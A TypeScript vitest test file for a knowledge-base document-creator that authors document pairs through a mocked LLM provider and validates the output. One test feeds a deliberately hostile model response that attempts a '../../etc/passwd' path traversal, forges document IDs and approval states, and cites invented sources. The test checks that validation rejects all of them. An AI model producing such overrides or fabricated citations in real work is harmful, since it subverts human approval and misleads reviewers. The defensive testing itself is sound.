import { createHash } from 'node:crypto';
import { copyFile, mkdir, mkdtemp, readdir, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { deflateSync } from 'node:zlib';
import { afterEach, describe, expect, it } from 'vitest';
import type { ModelExecutionRequest, ModelExecutionResponse } from '../../src/ai/provider-client.js';
import { buildCreatorApp } from '../../src/document-creator/app.js';
import {
  authorPairWorkUnit,
  buildPairAuthorPrompts,
  type CreatorAuthorProviderPort,
  type PairAuthorModelOutput
} from '../../src/document-creator/author.js';
import {
  validateCreatorDocument,
  type CreatorDocument,
  type KbProfile,
  type SourcePreparationBundle
} from '../../src/document-creator/contracts.js';
import { createDocumentPlan } from '../../src/document-creator/plan.js';
import {
  buildProfileFromInventoryFile,
  buildSaeLocalPilotProfile,
  resolveProfileInputSet
} from '../../src/document-creator/profiles.js';
import {
  prepareSourcesForPlan,
  type FetchResponseLike,
  type HttpFetchPort
} from '../../src/document-creator/sources.js';
import {
  validateAuthoredPair,
  validateCreatorDocumentAgainstContext
} from '../../src/document-creator/validate.js';

const tempDirs: string[] = [];

afterEach(async () => {
  for (const dir of tempDirs.splice(0)) {
    await rm(dir, { recursive: true, force: true });
  }
});

function sha256(content: string | Uint8Array): string {
  return createHash('sha256').update(content).digest('hex');
}

function buildTestTextPdf(pageLinesArray: string[][]): Buffer {
  const objects: Array<{ num: number; body: string; streamBytes: Buffer | null }> = [];
  const addObj = (body: string, streamBytes: Buffer | null = null): number => {
    const num = objects.length + 1;
    objects.push({ num, body, streamBytes });
    return num;
  };

  const fontNum = addObj(
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>'
  );
  const pageNums: number[] = [];

  for (const lines of pageLinesArray) {
    let y = 740;
    const ops = ['BT', '/F1 11 Tf'];
    for (const line of lines) {
      const escaped = line.replaceAll('\\', '\\\\').replaceAll('(', '\\(').replaceAll(')', '\\)');
      ops.push(`1 0 0 1 50 ${y} Tm (${escaped}) Tj`);
      y -= 18;
    }
    ops.push('ET');
    const compressed = deflateSync(Buffer.from(ops.join('\n'), 'latin1'));
    const contentNum = addObj(
      `<< /Length ${compressed.length} /Filter /FlateDecode >>`,
      compressed
    );
    const pageNum = addObj(
      `<< /Type /Page /Parent PAGES_REF 0 R /Resources << /Font << /F1 ${fontNum} 0 R >> >> /Contents ${contentNum} 0 R >>`
    );
    pageNums.push(pageNum);
  }

  const pagesNum = addObj(
    `<< /Type /Pages /Kids [${pageNums.map((n) => `${n} 0 R`).join(' ')}] /Count ${pageNums.length} >>`
  );
  const catalogNum = addObj(`<< /Type /Catalog /Pages ${pagesNum} 0 R >>`);

  const chunks: Buffer[] = [Buffer.from('%PDF-1.4\n', 'latin1')];
  for (const obj of objects) {
    const dict = obj.body.replaceAll('PAGES_REF', String(pagesNum));
    chunks.push(Buffer.from(`${obj.num} 0 obj\n${dict}\n`, 'latin1'));
    if (obj.streamBytes) {
      chunks.push(Buffer.from('stream\n', 'latin1'));
      chunks.push(obj.streamBytes);
      chunks.push(Buffer.from('\nendstream\n', 'latin1'));
    }
    chunks.push(Buffer.from('endobj\n', 'latin1'));
  }
  chunks.push(Buffer.from(`trailer\n<< /Root ${catalogNum} 0 R >>\n%%EOF\n`, 'latin1'));
  return Buffer.concat(chunks);
}

function mockHtmlResponse(
  status: number,
  body: string,
  headers: Record<string, string> = { 'content-type': 'text/html; charset=utf-8' }
): FetchResponseLike {
  const bytes = Buffer.from(body, 'utf8');
  const lowerHeaders = Object.fromEntries(
    Object.entries(headers).map(([k, v]) => [k.toLowerCase(), v])
  );
  return {
    status,
    headers: {
      get(name: string) {
        return lowerHeaders[name.toLowerCase()] ?? null;
      }
    },
    async *[Symbol.asyncIterator]() {
      yield bytes;
    },
    body: {
      async *[Symbol.asyncIterator]() {
        yield bytes;
      }
    }
  };
}

async function createSaeSandboxWithSources() {
  const workspace = await mkdtemp(join(tmpdir(), 'dc03-sae-'));
  tempDirs.push(workspace);

  const profile = await buildSaeLocalPilotProfile(process.cwd());
  for (const ref of profile.input_refs) {
    const dest = join(workspace, ref.path);
    await mkdir(dirname(dest), { recursive: true });
    await copyFile(ref.path, dest);
  }
  await mkdir(join(workspace, profile.source_policy.references_subdir), { recursive: true });
  await mkdir(join(workspace, profile.storage_ref.output_root), { recursive: true });

  const nistPdf = buildTestTextPdf([
    [
      'NIST AI RMF 1.0 MAP 1.1 and MANAGE 1.1',
      'Organizations evaluate expected benefits alongside costs, risks, and non-AI baselines before deployment.'
    ]
  ]);
  const nistRelPath = 'baseline/sae-training/references/NIST_AI_RMF_1.0.pdf';
  await writeFile(join(workspace, nistRelPath), nistPdf);

  profile.reference_pdf_bindings = [
    {
      source_id: 'SRC-NIST-AI-RMF',
      edition_version: 'AI RMF 1.0 (2023-01-26)',
      path: nistRelPath,
      sha256: sha256(nistPdf),
      usage_policy: 'PERMITTED_ATTRIBUTED_EXCERPT',
      rights_confirmed_for_model: true,
      provenance: 'Pinned local test PDF in references/'
    }
  ];

  const mockFetch: HttpFetchPort = async (url) => {
    if (url.includes('eur-lex.europa.eu')) {
      return mockHtmlResponse(
        200,
        '<html><body><h2>Article 9 — Risk management system</h2><p>Risk management measures shall be proportionate to the risks and evaluated across the AI lifecycle.</p></body></html>'
      );
    }
    return mockHtmlResponse(404, 'Not found');
  };

  return { workspace, profile, mockFetch };
}

function makeMockProviderPort(
  responder: (req: ModelExecutionRequest) => unknown
): { port: CreatorAuthorProviderPort; requests: ModelExecutionRequest[] } {
  const requests: ModelExecutionRequest[] = [];
  const port: CreatorAuthorProviderPort = async (req): Promise<ModelExecutionResponse> => {
    requests.push(req);
    const payload = responder(req);
    const rawText = JSON.stringify(payload);
    return {
      provider: 'OPENAI',
      model: 'mock-offline-author-v1',
      rawText,
      parsedJson: payload,
      inputTokens: 850,
      outputTokens: 920,
      latencyMs: 12,
      promptHash: sha256(`${req.systemPrompt}\n---\n${req.userPrompt}`)
    };
  };
  return { port, requests };
}

function buildValidPairA2ModelOutput(options: {
  sourceBundle: SourcePreparationBundle;
  variantLabel?: string;
  includeLifSection?: boolean;
}): PairAuthorModelOutput {
  const label = options.variantLabel ?? 'Baseline-Alpha';
  const includeLif = options.includeLifSection ?? true;
  const passages = options.sourceBundle.model_ready_packet.eligible_passages;
  const nistUnit = passages.find((p) => p.source_id === 'SRC-NIST-AI-RMF');
  const euUnit = passages.find((p) => p.source_id === 'SRC-EU-AIA');
  const validUnits = [nistUnit?.source_unit_id, euUnit?.source_unit_id].filter(
    (id): id is string => typeof id === 'string'
  );

  const capSections: PairAuthorModelOutput['capability']['sections'] = {
    DEF: {
      prose: `[${label}] A2 establishes technology-neutral problem framing, non-AI baseline comparison, and falsifiable value hypotheses before committing to AI.`,
      bullets: [
        'Problem and desired business outcome are stated independently of AI model selection.',
        'Current-state non-AI baseline and stop thresholds are documented.'
      ],
      question_ids: ['A2-Q1'],
      source_unit_ids: nistUnit ? [nistUnit.source_unit_id] : []
    },
    APP: {
      prose: `[${label}] Applies to all proposed and materially changed AI uses where complexity, cost, or affected-person exposure must be justified.`,
      bullets: ['Evaluate both new AI proposals and material expansions of existing workflows.']
    },
    CRI: {
      prose: `[${label}] Evaluates value framing, comparative proportionality, and empirical trial validation across A2-Q1 through A2-Q3.`,
      question_ids: ['A2-Q1', 'A2-Q2', 'A2-Q3']
    },
    EVI: {
      prose: `[${label}] Requires technology-neutral problem statements, option-comparison matrices, and representative trial results including negative findings.`,
      bullets: ['Proposal slides establish DECLARED intent only, never TESTED value.']
    },
    INT: {
      prose: `[${label}] Conflicting value baselines or missing trial evidence keep affected conclusions UNKNOWN until human adjudication.`,
      question_ids: ['A2-Q3']
    },
    REL: {
      prose: `[${label}] Paired with AP-A2 under non-inverse semantics; also informs A4 classification and A5 lifecycle gating.`
    },
    TAC: {
      prose: `[${label}] Associated playbook tactics provide advisory remediation workstreams only and never close findings or activate customer controls automatically.`
    },
    SRC: {
      prose: `[${label}] Separates sourced regulatory/guidance clauses from Solution Assurance methodology interpretations.`,
      source_unit_ids: validUnits
    },
    REV: {
      prose: `[${label}] Creation-review draft prepared from pinned SAE inputs; Knowledge Hub approval is separate.`
    }
  };

  if (includeLif) {
    capSections.LIF = {
      prose: `[${label}] Value hypotheses are declared at qualification, tested during validation, and re-verified during operational monitoring.`
    };
  }

  const apSections: PairAuthorModelOutput['antipattern']['sections'] = {
    DEF: {
      prose: `[${label}] AP-A2 captures solution-first AI adoption and value-theatre reporting where activity or model novelty substitutes for verified outcomes.`,
      question_ids: ['AP-A2-Q1']
    },
    IND: {
      prose: `[${label}] Triggered when AI selection precedes problem definition, non-AI options are omitted, or vanity usage counts replace outcome metrics.`,
      bullets: ['AI architecture chosen before baseline measurement', 'Activity metrics substitute for value']
    },
    CRI: {
      prose: `[${label}] Tests chronology of option selection, metric validity, and stop/continue governance across AP-A2-Q1 through AP-A2-Q3.`,
      question_ids: ['AP-A2-Q1', 'AP-A2-Q2', 'AP-A2-Q3']
    },
    ABS: {
      prose: `[${label}] TESTED_ABSENT requires a current, executed, scoped review of decision chronology, alternatives analysis, and trial records; missing AP evidence remains UNKNOWN even when A2 is NOT_SATISFIED.`
    },
    CON: {
      prose: `[${label}] Contradictions between pitch decks and trial outcomes are preserved; silence or absence of complaints never establishes anti-pattern absence.`
    },
    REL: {
      prose: `[${label}] Paired with A2 without inverse inference: A2 NOT_SATISFIED does not establish AP-A2 presence.`
    },
    TAC: {
      prose: `[${label}] Associated corrective tactics produce evidence for reassessment only and confer zero automatic finding closure.`
    },
    SRC: {
      prose: `[${label}] Distinguishes external source passages from cognitive-model absence and contradiction rules.`,
      source_unit_ids: validUnits
    },
    REV: {
      prose: `[${label}] Creation-review metadata and unresolved items for AP-A2.`
    }
  };

  if (includeLif) {
    apSections.LIF = {
      prose: `[${label}] Absence testing must be repeated when business case assumptions, user cohorts, or cost/risk profiles materially change.`
    };
  }

  return {
    capability: {
      sections: capSections,
      question_guidance: {
        'A2-Q1': 'Verify problem, baseline, and falsifiable value thresholds exist independently of AI.',
        'A2-Q2': 'Verify credible non-AI and simpler alternatives were compared on shared criteria.',
        'A2-Q3': 'Verify representative trial evidence and continuation/stop decisions are current.'
      },
      assessment_boundaries: {
        unknown_handling: [
          'Missing baseline or unexecuted trial evidence keeps A2 UNKNOWN rather than SATISFIED, without implying AP-A2 is present.'
        ],
        contradiction_handling: [
          'Conflicting business-case and evaluation metrics keep A2 UNKNOWN pending human adjudication.'
        ],
        false_positive_guards: [
          'Do not treat model benchmark accuracy or usage volume as proof of proportionate business value.'
        ],
        prohibited_inferences: [
          'Do not infer AP-A2 presence merely because A2 is NOT_SATISFIED or UNKNOWN.',
          'Do not infer legal compliance from satisfying A2.'
        ],
        human_decision_boundaries: [
          'Accountable business and risk owners decide value thresholds, stop/continue outcomes, and residual risk.'
        ],
        evidence_ceilings: [
          'Business case documents establish DECLARED intent only; executed trials are required for TESTED assurance.'
        ],
        paired_independence_rule:
          'Not satisfying capability A2 does not establish presence of anti-pattern AP-A2; AP-A2 requires independent positive evidence.'
      },
      sourced_claims: [
        {
          section_code: 'SRC',
          statement: `[${label}] Risk management and proportionality evaluations compare expected benefits, costs, and baselines before and during AI use.`,
          source_unit_ids: validUnits,
          applicability_note:
            'Voluntary guidance and applicable EU AI Act risk-management context; legal applicability remains a human determination.',
          cited_sources: nistUnit
            ? [
                {
                  source_unit_id: nistUnit.source_unit_id,
                  source_id: nistUnit.source_id,
                  source_version: nistUnit.source_version,
                  locator: nistUnit.locator_label
                }
              ]
            : []
        }
      ],
      methodology_interpretations: [
        {
          section_code: 'INT',
          statement:
            'Under the SAE cognitive model, unverified value claims cap technical assurance at DECLARED and require explicit stop/continue criteria.',
          cognitive_rule_refs: [
            'evidence_admissibility_and_ceilings',
            'unknown_is_valid_non_compliant_result'
          ],
          question_ids: ['A2-Q1', 'A2-Q3']
        }
      ],
      related_object_links: [
        {
          target_object_id: 'AP-A2',
          non_inverse_meaning:
            'Paired anti-pattern assessed independently; A2 gaps do not establish AP-A2 presence.'
        },
        {
          target_object_id: 'A5',
          non_inverse_meaning: 'Value validation informs lifecycle stage gate readiness in A5.'
        }
      ],
      tactic_refs: [
        {
          tactic_id: 'TAC-PURPOSE-A2-01',
          scope_and_boundary_note:
            'Advisory tactic to establish baseline and value hypothesis; requires reassessment and never closes findings.'
        }
      ]
    },
    antipattern: {
      sections: apSections,
      question_guidance: {
        'AP-A2-Q1': 'Check decision chronology for pre-committed AI selection ahead of problem and alternative framing.',
        'AP-A2-Q2': 'Check whether activity/adoption counts substitute for outcome and harm comparisons.',
        'AP-A2-Q3': 'Check for evidence of continued progression after failed trials or verify a complete scoped absence test.'
      },
      assessment_boundaries: {
        unknown_handling: [
          'When capability A2 is NOT_SATISFIED but AP-A2 chronology and trial evidence are missing, AP-A2 must remain UNKNOWN rather than CONFIRMED_PRESENT or TESTED_ABSENT.'
        ],
        contradiction_handling: [
          'Preserve conflicting executive claims and negative trial records without smoothing.'
        ],
        false_positive_guards: [
          'Do not treat a bounded exploratory feasibility spike with explicit stop gates as solution-first lock-in.'
        ],
        prohibited_inferences: [
          'Do not infer anti-pattern absence from silence, zero reported incidents, or missing complaints.',
          'Do not infer AP-A2 presence solely from an A2 capability gap.'
        ],
        human_decision_boundaries: [
          'Human governance authority is required to lock AP-A2 findings and authorize requalification or stop decisions.'
        ],
        evidence_ceilings: [
          'TESTED_ABSENT requires a current, executed, scoped absence test; policy documents alone never establish absence.'
        ],
        paired_independence_rule:
          'Capability A2 being NOT_SATISFIED does not establish AP-A2 presence, and AP-A2 UNKNOWN does not satisfy A2.',
        failure_mechanism:
          'Technology-first commitment and vanity activity reporting bypass comparative alternatives analysis and hide negative value or risk signals during progression.',
        observable_indicators: [
          'AI architecture selected prior to problem and baseline definition',
          'Activity metrics substitute for value',
          'Negative pilot results omitted from progression dossiers'
        ],
        non_examples: [
          'Time-boxed technical spike governed by pre-declared falsification and non-AI comparison gates'
        ],
        tested_absence_requirements: [
          'Reconcile decision chronology showing problem and baseline preceded AI selection.',
          'Verify executed comparison of non-AI/lower-complexity options and complete trial result disclosure for the current system version.'
        ]
      },
      sourced_claims: [
        {
          section_code: 'SRC',
          statement: `[${label}] Lifecycle risk management requires iterative evaluation rather than one-off promotional assumptions.`,
          source_unit_ids: euUnit ? [euUnit.source_unit_id] : [],
          applicability_note:
            'Relevant statutory vocabulary when Regulation (EU) 2024/1689 applies; Creator does not adjudicate legal applicability.'
        }
      ],
      methodology_interpretations: [
        {
          section_code: 'ABS',
          statement:
            'Under SAE tested-absence rules, missing evidence or absence of complaints keeps AP-A2 UNKNOWN and can never produce TESTED_ABSENT.',
          cognitive_rule_refs: [
            'antipattern_tested_absence_required',
            'false_positive_guards_and_prohibited_inferences'
          ],
          question_ids: ['AP-A2-Q3']
        }
      ],
      related_object_links: [
        {
          target_object_id: 'A2',
          non_inverse_meaning:
            'Paired capability assessed independently; A2 NOT_SATISFIED never automatically implies AP-A2 presence.'
        }
      ],
      tactic_refs: [
        {
          tactic_id: 'TAC-PURPOSE-AP-A2-01',
          scope_and_boundary_note:
            'Corrective reset candidate only; completion yields new evidence for reassessment without automatic finding closure.'
        }
      ]
    }
  };
}

describe('DC-03: Author and render one fresh pair (internal contract, author, validate, render, UI)', () => {
  it('D-01, D-06, T-01, T-03: materializes fresh non-Golden PAIR-A2 responses directly into validated models, two independent Markdown files, and sanitized preview without Golden contamination or unsolicited tactics', async () => {
    const { workspace, profile, mockFetch } = await createSaeSandboxWithSources();
    const runtime = await resolveProfileInputSet({ workspaceRoot: workspace, profile });
    const plan = createDocumentPlan(runtime, { mode: 'pair', pair_ids: ['PAIR-A2'] });
    const sourceBundle = await prepareSourcesForPlan({
      workspaceRoot: workspace,
      runtime,
      plan,
      enableUrlAcquisition: true,
      fetchPort: mockFetch
    });

    // D-06: Inspect prompt before generation to prove Golden A1/AP-A1 domain prose is NOT injected.
    const capPlanned = plan.documents.find((d) => d.object_id === 'A2')!;
    const apPlanned = plan.documents.find((d) => d.object_id === 'AP-A2')!;
    const builtPrompts = buildPairAuthorPrompts({
      runtime,
      workUnit: plan.work_units[0]!,
      capabilityDoc: capPlanned,
      antipatternDoc: apPlanned,
      pairBaseline: sourceBundle.pair_baselines[0]!,
      sourceBundle
    });
    expect(builtPrompts.goldenCalibration.calibration_pair_id).toBe('PAIR-A1');
    expect(builtPrompts.goldenCalibration.capability_structure.atomic_subcriteria_count).toBe(9);
    expect(builtPrompts.userPrompt).not.toContain(
      'Ambiguous or inconsistent intent allows technical capability'
    );
    expect(builtPrompts.userPrompt).not.toContain(
      'Ensure the system is designed, evaluated, operated and changed against one explicit socio-technical purpose'
    );
    expect(builtPrompts.userPrompt).not.toContain('GOV-PUR-001');
    expect(builtPrompts.userPrompt).toContain('PDF page 10 (A2 / AP-A2)');

    // D-01 Run 1: Author with Variant Alpha.
    const alphaMock = makeMockProviderPort(() =>
      buildValidPairA2ModelOutput({ sourceBundle, variantLabel: 'Fresh-Run-Alpha' })
    );
    const alphaResult = await authorPairWorkUnit({
      runtime,
      plan,
      sourceBundle,
      pairId: 'PAIR-A2',
      providerPort: alphaMock.port,
      documentVersion: '1.0.0-draft.1'
    });

    expect(alphaMock.requests).toHaveLength(1);
    expect(validateCreatorDocument(alphaResult.capability)).toEqual([]);
    expect(validateCreatorDocument(alphaResult.antipattern)).toEqual([]);
    expect(alphaResult.validation.draft_valid).toBe(true);
    expect(alphaResult.validation.delivery_ready).toBe(true);

    // T-01: Final SAE playbook tactics are retained with OBJECT_LINK_ASSOCIATED despite PENDING_KB_FINDING_MAPPING.
    expect(alphaResult.capability.tactic_associations.map((t) => t.tactic_id)).toEqual([
      'TAC-PURPOSE-A2-01',
      'TAC-PURPOSE-A2-02',
      'TAC-PURPOSE-A2-03'
    ]);
    expect(
      alphaResult.capability.tactic_associations.every(
        (t) =>
          t.effective_association_status === 'OBJECT_LINK_ASSOCIATED' &&
          t.original_activation_status === 'PENDING_KB_FINDING_MAPPING' &&
          t.activation_authority === 'NONE_IN_CREATOR'
      )
    ).toBe(true);
    expect(alphaResult.antipattern.tactic_associations.map((t) => t.tactic_id)).toEqual([
      'TAC-PURPOSE-A2-01',
      'TAC-PURPOSE-A2-02',
      'TAC-PURPOSE-A2-03',
      'TAC-PURPOSE-AP-A2-01'
    ]);

    // T-03: Zero tactic documents planned or generated.
    expect(plan.summary.tactic_count).toBe(0);

    // D-01 Run 2: Controlled change in provider response directly changes rendered Markdown and hashes!
    const betaMock = makeMockProviderPort(() =>
      buildValidPairA2ModelOutput({ sourceBundle, variantLabel: 'Controlled-Delta-Beta' })
    );
    const betaResult = await authorPairWorkUnit({
      runtime,
      plan,
      sourceBundle,
      pairId: 'PAIR-A2',
      providerPort: betaMock.port,
      documentVersion: '1.0.0-draft.1'
    });

    expect(alphaResult.rendered.capability.markdown).toContain('[Fresh-Run-Alpha]');
    expect(betaResult.rendered.capability.markdown).toContain('[Controlled-Delta-Beta]');
    expect(betaResult.rendered.capability.markdown).not.toContain('[Fresh-Run-Alpha]');
    expect(betaResult.rendered.capability.markdown_sha256).not.toBe(
      alphaResult.rendered.capability.markdown_sha256
    );
    expect(betaResult.capability.provenance.content_sha256).not.toBe(
      alphaResult.capability.provenance.content_sha256
    );

    // Write the two independent Markdown files to a temporary directory only and inspect structure.
    const tmpOut = await mkdtemp(join(tmpdir(), 'dc03-rendered-md-'));
    tempDirs.push(tmpOut);
    const capFile = join(tmpOut, 'A2_document.md');
    const apFile = join(tmpOut, 'AP-A2_document.md');
    await writeFile(capFile, betaResult.rendered.capability.markdown, 'utf8');
    await writeFile(apFile, betaResult.rendered.antipattern.markdown, 'utf8');

    const capMdDisk = await readFile(capFile, 'utf8');
    const apMdDisk = await readFile(apFile, 'utf8');
    expect(capMdDisk).toContain('document_id: "solution-assurance-engine:A2"');
    expect(capMdDisk).toContain('hub_approval_status: "NOT_GRANTED_BY_CREATOR"');
    expect(capMdDisk).toContain('## A2.DEF — Identity, definition, purpose, and scope');
    expect(capMdDisk).toContain('## A2.BIB — Source Bibliography and Usage Boundaries');
    expect(capMdDisk).toContain('SRC-NIST-AI-RMF');
    expect(capMdDisk).toContain('AI RMF 1.0 (2023-01-26)');
    expect(capMdDisk).toContain('PERMITTED_ATTRIBUTED_EXCERPT');

    expect(apMdDisk).toContain('document_id: "solution-assurance-engine:AP-A2"');
    expect(apMdDisk).toContain('## AP-A2.ABS — Presence interpretation, tested-absence requirements, and unknown handling');
    expect(apMdDisk).toContain('## AP-A2.BIB — Source Bibliography and Usage Boundaries');
    expect(apMdDisk).not.toContain('Undefined or elastic intended purpose');

    // Verify repository baseline/sae-training/knowledge-base/ remains completely untouched!
    for (const dom of ['A', 'B', 'C', 'D', 'E', 'F']) {
      const entries = await readdir(join('baseline/sae-training/knowledge-base', dom));
      expect(entries).toEqual(['.gitkeep']);
    }
  });

  it('D-02 & T-03: blocks model attempts to override IDs/paths/states, rejects invented source/question/tactic/object handles and locators, and rejects unsolicited tactic documents', async () => {
    const { workspace, profile, mockFetch } = await createSaeSandboxWithSources();
    const runtime = await resolveProfileInputSet({ workspaceRoot: workspace, profile });
    const plan = createDocumentPlan(runtime, { mode: 'pair', pair_ids: ['PAIR-A2'] });
    const sourceBundle = await prepareSourcesForPlan({
      workspaceRoot: workspace,
      runtime,
      plan,
      enableUrlAcquisition: true,
      fetchPort: mockFetch
    });

    const nistPassage = sourceBundle.model_ready_packet.eligible_passages.find(
      (p) => p.source_id === 'SRC-NIST-AI-RMF'
    )!;

    const hostilePayload = buildValidPairA2ModelOutput({ sourceBundle });
    const rawHostile: Record<string, unknown> = {
      ...hostilePayload,
      // T-03 violation attempt: unsolicited tactic document payload
      tactic_documents: [{ tactic_id: 'TAC-PURPOSE-A2-01', markdown: '# Unsolicited tactic' }],
      capability: {
        ...hostilePayload.capability,
        // D-02 code-owned override attempts:
        document_id: 'attacker-kb:HACKED-ID',
        kb_id: 'attacker-kb',
        object_id: 'HACKED-OBJ',
        destination_path_template: '../../etc/passwd',
        creation_review_state: 'APPROVED',
        hub_approval_status: 'APPROVED',
        sections: {
          ...hostilePayload.capability.sections,
          DEF: {
            ...hostilePayload.capability.sections.DEF!,
            section_id: 'CUSTOM.WRONG_ID',
            question_ids: ['A2-Q99-INVENTED'],
            source_unit_ids: ['deadbeef'.repeat(8)]
          }
        },
        sourced_claims: [
          {
            section_code: 'SRC',
            statement: 'Claim with invented source unit handle.',
            source_unit_ids: ['feedface'.repeat(8)]
          },
          {
            section_code: 'SRC',
            statement: 'Claim with real source_unit_id but invented locator and wrong edition.',
            source_unit_ids: [nistPassage.source_unit_id],
            cited_sources: [
              {
                source_unit_id: nistPassage.source_unit_id,
                source_id: 'SRC-NIST-AI-RMF',
                source_version: 'INVENTED-EDITION-9.9',
                locator: 'Invented Annex Z Section 999'
              }
            ]
          }
        ],
        related_object_links: [
          { target_object_id: 'INVENTED-OBJ-99', non_inverse_meaning: 'Fake link' }
        ],
        tactic_refs: [
          { tactic_id: 'TAC-INVENTED-999', scope_and_boundary_note: 'Fake tactic' }
        ]
      }
    };

    const { port } = makeMockProviderPort(() => rawHostile);
    const result = await authorPairWorkUnit({
      runtime,
      plan,
      sourceBundle,
      pairId: 'PAIR-A2',
      providerPort: port
    });

    // Code-owned identities, section IDs, paths, and non-approval state CANNOT be altered by model output!
    expect(result.capability.document_id).toBe('solution-assurance-engine:A2');
    expect(result.capability.kb_id).toBe('solution-assurance-engine');
    expect(result.capability.object_id).toBe('A2');
    expect(result.capability.destination_path_template).toBe('A/capabilities/A2/{version}/document.md');
    expect(result.capability.sections[0]?.section_id).toBe('A2.DEF');
    expect(result.capability.hub_approval_status).toBe('NOT_GRANTED_BY_CREATOR');
    expect(result.capability.creation_review_state).toBe('DRAFT_BLOCKED_VALIDATION');

    // Claims with invented handles or mismatched edition/locator are forced to UNRESOLVED, never SOURCE_SUPPORTED!
    expect(result.capability.sourced_claims.every((c) => c.support_state === 'UNRESOLVED')).toBe(
      true
    );

    // Deterministic validation blocks draft_valid & delivery_ready with explicit findings.
    expect(result.validation.draft_valid).toBe(false);
    expect(result.validation.delivery_ready).toBe(false);
    const capCodes = result.validation.capability.findings.map((f) => f.code);
    expect(capCodes).toEqual(
      expect.arrayContaining([
        'UNSOLICITED_TACTIC_DOCUMENT_REJECTED',
        'MODEL_OWNED_FIELD_OVERRIDE_REJECTED',
        'INVENTED_OR_FOREIGN_QUESTION_ID',
        'INVENTED_OR_INELIGIBLE_SOURCE_HANDLE',
        'SOURCE_VERSION_BINDING_MISMATCH',
        'INVENTED_SOURCE_LOCATOR_REJECTED',
        'INVENTED_RELATED_OBJECT_ID',
        'INVENTED_TACTIC_ID'
      ])
    );

    // Also verify validateAuthoredPair directly rejects non-empty generatedTacticDocuments when unrequested (T-03).
    const directPairValidation = validateAuthoredPair({
      workUnitId: result.work_unit_id,
      pairId: 'PAIR-A2',
      capability: result.capability,
      antipattern: result.antipattern,
      generatedTacticDocuments: [{ id: 'TAC-PURPOSE-A2-01' }],
      runtime,
      plan,
      sourceBundle
    });
    expect(
      directPairValidation.pair_findings.some(
        (f) => f.code === 'UNSOLICITED_TACTIC_DOCUMENT_GENERATED'
      )
    ).toBe(true);
  });

  it('S-02: keeps claims explicitly UNRESOLVED when Source Register entries lack readable passages, and rejects citing METADATA_ONLY units as support', async () => {
    const profile = await buildSaeLocalPilotProfile(process.cwd());
    const runtime = await resolveProfileInputSet({ workspaceRoot: process.cwd(), profile });
    const plan = createDocumentPlan(runtime, { mode: 'pair', pair_ids: ['PAIR-A2'] });

    // Offline preparation with enableUrlAcquisition=false -> zero eligible passages in model_ready_packet!
    const offlineBundle = await prepareSourcesForPlan({
      workspaceRoot: process.cwd(),
      runtime,
      plan,
      enableUrlAcquisition: false
    });
    expect(offlineBundle.model_ready_packet.eligible_passages).toEqual([]);

    // 1. Honest draft with empty source_unit_ids keeps claims UNRESOLVED (draft_valid=true, delivery_ready=false).
    const honestDraft = buildValidPairA2ModelOutput({ sourceBundle: offlineBundle });
    const { port: honestPort } = makeMockProviderPort(() => honestDraft);
    const honestResult = await authorPairWorkUnit({
      runtime,
      plan,
      sourceBundle: offlineBundle,
      pairId: 'PAIR-A2',
      providerPort: honestPort
    });

    expect(honestResult.validation.draft_valid).toBe(true);
    expect(honestResult.validation.delivery_ready).toBe(false);
    expect(honestResult.capability.creation_review_state).toBe('REVIEW_REQUIRED');
    expect(honestResult.capability.sourced_claims[0]?.support_state).toBe('UNRESOLVED');
    expect(
      honestResult.capability.unresolved_items.some((u) => u.category === 'MISSING_SOURCE_SUPPORT')
    ).toBe(true);
    expect(honestResult.rendered.capability.markdown).toContain('[UNRESOLVED');

    // 2. Attempting to cite a METADATA_ONLY unit (e.g. SRC-ISO-42001-2023) is rejected as an error!
    const isoMetaUnit = offlineBundle.source_units.find(
      (u) => u.source_id === 'SRC-ISO-42001-2023' && u.extraction_status === 'METADATA_ONLY'
    )!;
    expect(isoMetaUnit).toBeDefined();

    const metadataMisuseDraft = buildValidPairA2ModelOutput({ sourceBundle: offlineBundle });
    metadataMisuseDraft.capability.sourced_claims = [
      {
        section_code: 'SRC',
        statement: 'Attempting to substantiate a normative claim from metadata-only ISO record.',
        source_unit_ids: [isoMetaUnit.source_unit_id]
      }
    ];
    const { port: misusePort } = makeMockProviderPort(() => metadataMisuseDraft);
    const misuseResult = await authorPairWorkUnit({
      runtime,
      plan,
      sourceBundle: offlineBundle,
      pairId: 'PAIR-A2',
      providerPort: misusePort
    });

    expect(misuseResult.capability.sourced_claims[0]?.support_state).toBe('UNRESOLVED');
    expect(misuseResult.validation.draft_valid).toBe(false);
    expect(
      misuseResult.validation.capability.findings.some(
        (f) => f.code === 'INVENTED_OR_INELIGIBLE_SOURCE_HANDLE'
      )
    ).toBe(true);
  });

  it('D-03 & D-04: enforces independent capability/anti-pattern unknown handling and catches silence-as-absence or inverse-pair inferences', async () => {
    const { workspace, profile, mockFetch } = await createSaeSandboxWithSources();
    const runtime = await resolveProfileInputSet({ workspaceRoot: workspace, profile });
    const plan = createDocumentPlan(runtime, { mode: 'pair', pair_ids: ['PAIR-A2'] });
    const sourceBundle = await prepareSourcesForPlan({
      workspaceRoot: workspace,
      runtime,
      plan,
      enableUrlAcquisition: true,
      fetchPort: mockFetch
    });

    const badInferenceDraft = buildValidPairA2ModelOutput({ sourceBundle });
    // D-03 violation: claiming capability NOT_SATISFIED proves anti-pattern presence
    badInferenceDraft.capability.sections.REL!.prose =
      'When capability A2 is NOT_SATISFIED, anti-pattern AP-A2 is present automatically.';
    // D-04 violation: offering silence / zero incidents as proof of anti-pattern absence
    badInferenceDraft.antipattern.sections.ABS!.prose =
      'Zero reported incidents and silence in audit logs prove anti-pattern absence and satisfy TESTED_ABSENT.';
    badInferenceDraft.antipattern.assessment_boundaries.tested_absence_requirements = [];
    badInferenceDraft.antipattern.assessment_boundaries.unknown_handling = [
      'Default to absent when evidence is unavailable.'
    ];

    const { port } = makeMockProviderPort(() => badInferenceDraft);
    const result = await authorPairWorkUnit({
      runtime,
      plan,
      sourceBundle,
      pairId: 'PAIR-A2',
      providerPort: port
    });

    expect(result.validation.draft_valid).toBe(false);
    expect(result.validation.capability.findings.map((f) => f.code)).toContain(
      'PROHIBITED_INVERSE_PAIR_INFERENCE'
    );
    expect(result.validation.antipattern.findings.map((f) => f.code)).toEqual(
      expect.arrayContaining([
        'PROHIBITED_SILENCE_AS_ABSENCE_INFERENCE',
        'MISSING_TESTED_ABSENCE_REQUIREMENTS',
        'MISSING_INDEPENDENT_AP_UNKNOWN_HANDLING'
      ])
    );
  });

